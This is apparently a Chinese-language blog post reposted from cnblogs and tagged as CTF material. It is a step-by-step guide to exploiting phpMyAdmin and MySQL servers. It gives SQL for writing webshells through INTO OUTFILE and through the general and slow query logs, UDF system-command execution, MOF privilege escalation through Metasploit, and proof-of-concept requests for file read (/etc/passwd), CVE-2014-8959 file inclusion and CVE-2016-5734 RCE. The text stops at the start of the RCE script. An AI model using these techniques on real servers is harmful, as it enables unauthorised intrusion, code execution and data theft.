<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>phpmyadmin各版本漏洞利用 | 逃    避    現    實</title><meta name="keywords" content="CTF-Web,PHP"><meta name="author" content="1ustinianus"><meta name="copyright" content="1ustinianus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="转自网络,稍作修改">
<meta property="og:type" content="article">
<meta property="og:title" content="phpmyadmin各版本漏洞利用">
<meta property="og:url" content="http://gswanx.github.io/post/a458c677.html">
<meta property="og:site_name" content="逃    避    現    實">
<meta property="og:description" content="转自网络,稍作修改">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://gswanx.github.io/img/headddd.jpg">
<meta property="article:published_time" content="2022-10-20T01:55:02.000Z">
<meta property="article:modified_time" content="2022-10-20T02:09:54.948Z">
<meta property="article:author" content="1ustinianus">
<meta property="article:tag" content="CTF-Web">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://gswanx.github.io/img/headddd.jpg"><link rel="shortcut icon" href="/img/17150526893.png"><link rel="canonical" href="http://gswanx.github.io/post/a458c677"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'phpmyadmin各版本漏洞利用',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-20 10:09:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/title.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3571753_hc60oskdsr8.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/headddd.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/754566.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">逃    避    現    實</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">phpmyadmin各版本漏洞利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-20T01:55:02.000Z" title="发表于 2022-10-20 09:55:02">2022-10-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-20T02:09:54.948Z" title="更新于 2022-10-20 10:09:54">2022-10-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/PHP/">PHP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="phpmyadmin各版本漏洞利用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>转自:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html</a></p>
<blockquote>
<p><code>phpMyAdmin</code> 是一个以PHP为基础，以<code>Web-Base</code>方式架构在网站主机上的<code>MySQL</code>的数据库管理工具，让管理者可用Web接口管理<code>MySQL</code>数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于<code>phpMyAdmin</code>跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由<code>phpMyAdmin</code>建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p>
</blockquote>
<h1 id="1信息收集"><a href="#1信息收集" class="headerlink" title="1信息收集"></a>1信息收集</h1><h2 id="1-1-版本信息获取"><a href="#1-1-版本信息获取" class="headerlink" title="1.1 版本信息获取"></a>1.1 版本信息获取</h2><p>获取<code>phpmyadmin</code>版本信息，在<strong>网址根路径</strong>后面添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readme.php</span><br><span class="line">README</span><br><span class="line">changelog.php</span><br><span class="line">Change</span><br><span class="line">Documetation.html</span><br><span class="line">Documetation.txt</span><br><span class="line">translators.html</span><br></pre></td></tr></table></figure>

<p>（注意区分大小写）就可以看到<code>phpmyadmin</code>的相关版本信息了，这个方法也是通杀的，只要管理员不把他们删掉。</p>
<p>也可以直接访问：<code>/doc/html/index.html</code>目录</p>
<h2 id="1-2-绝对路径获取"><a href="#1-2-绝对路径获取" class="headerlink" title="1.2 绝对路径获取"></a>1.2 绝对路径获取</h2><p>(1) <code>phpinfo()</code> 页面：最理想的情况，直接显示web路径<br>(2) web报错信息：可以通过各种<code>fuzz</code>尝试让目标报错，也有可能爆出绝对路径<br>(3) 一些集成的web框架：如果目标站点是利用<code>phpstudy</code>、<code>LAMPP</code>等之类搭建的，可以通过查看数据库路径</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%datadir%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>再猜解web路径的方法，一般容易成功。<br>(4) 利用<code>select load_file()</code>读取文件找到web路径：可以尝试<code>/etc/passwd</code>，<code>apache|nginx|httpd log</code>之类的文件。</p>
<p><em>Trick：如何判断目录是否存在，往往确定了<code>/var/www/html</code>目录，但是还有一层目录不能 确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用</em></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/$fuzz$/shell.php&#x27;</span>；</span><br></pre></td></tr></table></figure>

<p>时目录fuzzfuzz不存在将会报错<code>Can&#39;t create/write to file &#39;/var/www/html/666.txt&#39; (Errcode: 2);</code>如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">load</span> data infile <span class="string">&quot;/etc/passwd&quot;</span> into <span class="built_in">table</span> test;</span><br></pre></td></tr></table></figure>

<p>该语句执行后将也会显示文件是否存在，有权限能否写等信息。</p>
<p>（5）其他方法</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看数据库表内容获取 有一些cms会保存网站配置文件 或者路径</span><br><span class="line"><span class="number">2</span>.进入后台</span><br><span class="line"><span class="number">3</span>.百度出错信息 zoomeye shadon 搜索<span class="literal">error</span> <span class="literal">warning</span></span><br><span class="line"><span class="number">4</span>. @@datadir参数看mysql路径 反猜绝对路径</span><br></pre></td></tr></table></figure>



<h1 id="2PhpMyAdmin利用"><a href="#2PhpMyAdmin利用" class="headerlink" title="2PhpMyAdmin利用"></a>2PhpMyAdmin利用</h1><h2 id="2-1-写入文件GetShell"><a href="#2-1-写入文件GetShell" class="headerlink" title="2.1 写入文件GetShell"></a>2.1 写入文件GetShell</h2><p>可以通过写shell进行提权，而我们需要满足以下条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.数据库root权限</span><br><span class="line">2.知道网站的物理路径</span><br><span class="line">3.数据库有写权限</span><br></pre></td></tr></table></figure>

<p><code>MySQL 5.0+</code>的版本会，然后在服务运行的情况下修改变量变量也可以移动文件位置的，但是必须要对生成日志的目录具有可更改的写权限。（Linux环境下可能会比较苛刻，因为站点目录是一个用户，MySQL是另外一个用户，权限管控较大严格，主要取决于权限配置是否得当）</p>
<h3 id="2-1-1-直接写入文件getshell"><a href="#2-1-1-直接写入文件getshell" class="headerlink" title="2.1.1 直接写入文件getshell"></a>2.1.1 直接写入文件getshell</h3><p>直接用<code>into outfile</code>直接在网站目录下写入webshell，但是该方法需要前提条件是：<br>(1) 当前的数据库用户有写权限<br>(2) 知道web绝对路径<br>(3) web路径能写</p>
<p>如何判断当前数据库用户有写权限？<br>执行：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>如果secure_file_priv如果非空，则只能在对应的目录下读文件，如果是空即可在其他目录写。Linux下默认&#x2F;tmp目录可写。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secure<span class="operator">-file</span><span class="literal">-priv</span>特性</span><br><span class="line">secure<span class="operator">-file</span><span class="literal">-priv</span>参数是用来限制LOAD <span class="keyword">DATA</span>, <span class="built_in">SELECT</span> ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。</span><br><span class="line">当secure_file_priv的值为null ，表示限制mysql 不允许导入|导出</span><br><span class="line">当secure_file_priv的值为/tmp/ ，表示限制mysql 的导入|导出只能发生在/tmp/目录下</span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysql 的导入|导出做限制</span><br><span class="line">可以在mysql<span class="literal">-ini</span>文件中设置其属性</span><br></pre></td></tr></table></figure>

<p>编写一句phpinfo文件，</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&quot; INTO OUTFILE  &quot;d:\\phpstudy\\www\\7.php&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里必须注意要双反斜线，否则会转义，</p>
<h3 id="2-1-2-通过写入日志文件getshell"><a href="#2-1-2-通过写入日志文件getshell" class="headerlink" title="2.1.2 通过写入日志文件getshell"></a>2.1.2 通过写入日志文件getshell</h3><p>读写权限+web绝对路径，修改日志文件为webshell</p>
<p>具体利用方法如下</p>
<p>(1) 开启日志记录:</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>(2) 查看当前的日志目录:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>(3) 指定日志文件</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">&quot;C:/phpStudy/PHPTutorial/WWW/404.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>(4)) 写入执行代码：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-3-通过慢查询写入webshell"><a href="#2-1-3-通过慢查询写入webshell" class="headerlink" title="2.1.3 通过慢查询写入webshell"></a>2.1.3 通过慢查询写入webshell</h3><p>具体方法如下：</p>
<p>(1) 查看当前慢查询日志目录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>(2) 重新设置路径：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/PHPTutorial/WWW/slow.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>(3) 开启慢查询日志：</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log=<span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>

<p>(4)) 执行写入日志：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; from mysql.db where sleep(10);</span></span><br></pre></td></tr></table></figure>



<h2 id="2-2-User-defined-funct-ion（UDF）："><a href="#2-2-User-defined-funct-ion（UDF）：" class="headerlink" title="2.2 User defined funct ion（UDF）："></a><strong>2.2 User defined funct ion（UDF）：</strong></h2><p>适用于Windows和Linux环境，利用需要的条件：具有写权限+插件目录可写（或者可以更改指定的插件目录）。具体情况要看目标mysql的版本：<br>(1) <code>Mysql version &gt; 5.1</code>时，dll或者so必须位于mysql安装目录<code>lib\plugin</code>下，当对该目录具有写权限时可以利用，查看：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="operator">%</span>plugin<span class="operator">%</span>；<span class="operator">/</span><span class="operator">/</span> 查看插件目录</span><br></pre></td></tr></table></figure>

<p>(2) 5.0 &lt;&#x3D; Mysql version &lt;5.1时，需要导出至目标服务器的系统目录，如C:&#x2F;&#x2F;Windows&#x2F;System32<br>(3) Mysql version &lt; 5.0 时，目录可以自定义具体利用如下：<br>a 根据目标mysql版本写入特定目录的so或者dll，可以参考sqlmap里面的</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;It is dll&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\Program Files\MySQL\MySQL Server 5.1\l ib\plugin\lib_mysqludf_sys.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>b 创建对应的function：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname &quot;lib_mysqludf_sys.dll&quot;;</span><br></pre></td></tr></table></figure>

<p>c 执行命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;sys_eval&#x27;</span>;   	 #查看创建的sys_eval函数<span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);                          			 #使用系统命令</span><br></pre></td></tr></table></figure>



<h2 id="2-3-MOF提权："><a href="#2-3-MOF提权：" class="headerlink" title="2.3 MOF提权："></a>2.3 MOF提权：</h2><p>通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次上传的MOF。一般适用于Windows &lt;&#x3D; 2003，并且<code>C:\Windows\System32\mof</code>目录具有写权限（一般是没有权限写）。可以使用MSF直接利用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.1.5</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_labelTop">回到顶部</a></p>
<h1 id="3PhpMyAdmin漏洞利用"><a href="#3PhpMyAdmin漏洞利用" class="headerlink" title="3PhpMyAdmin漏洞利用"></a>3PhpMyAdmin漏洞利用</h1><h2 id="3-1-WooYun-2016-199433：任意文件读取漏洞"><a href="#3-1-WooYun-2016-199433：任意文件读取漏洞" class="headerlink" title="3.1 WooYun-2016-199433：任意文件读取漏洞"></a>3.1 WooYun-2016-199433：任意文件读取漏洞</h2><p>影响范围：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">	2.x版本</span></span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /scripts/setup.php HTTP/1.1 </span><br><span class="line"><span class="section">Host: your-ip:8080</span></span><br><span class="line"><span class="section">Accept-Encoding: gzip, deflate Accept: */*</span></span><br><span class="line"><span class="section">Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)</span></span><br><span class="line"><span class="section">Connection: close</span></span><br><span class="line"><span class="section">Content-Type: application/x-www-form-urlencoded </span></span><br><span class="line"><span class="section">Content-Length: 80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action=test&amp;configuration=O:10:<span class="string">&quot;PMA_Config&quot;</span>:1:&#123;s:6:<span class="string">&quot;source&quot;</span>,s:11:<span class="string">&quot;/etc/passwd&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-2-CVE-2014-8959：本地文件包含"><a href="#3-2-CVE-2014-8959：本地文件包含" class="headerlink" title="3.2 CVE-2014 -8959：本地文件包含"></a>3.2 CVE-2014 -8959：本地文件包含</h2><p>影响范围：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">	4.0.1~4.2.12</span></span><br><span class="line"><span class="code">PHP version</span></span><br><span class="line"><span class="code">	&lt; 5.3.4</span></span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00    </span><br><span class="line"><span class="comment"># 注意改下token值</span></span><br></pre></td></tr></table></figure>

<p>在实际利用中可以利用写入文件到&#x2F;tmp目录下结合此漏洞完成RCE，php版本可以通过http header、导出表内容到文件的附加内容看到。</p>
<h2 id="3-3-CVE-2016-5734-：后台命令执行RCE"><a href="#3-3-CVE-2016-5734-：后台命令执行RCE" class="headerlink" title="3.3 CVE-2016-5734 ：后台命令执行RCE"></a>3.3 CVE-2016-5734 ：后台命令执行RCE</h2><p>影响范围：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">	4.0.10.16 之前的4.0.x版本</span></span><br><span class="line"><span class="code">	4.4.15.7 之前的 4.4.x版本</span></span><br><span class="line"><span class="code">	4.6.3之前的 4.6.x版本</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">PHP version</span><br><span class="line"><span class="code">	4.3.0~5.4.6</span></span><br><span class="line"><span class="code">Php 5.0 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</span></span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 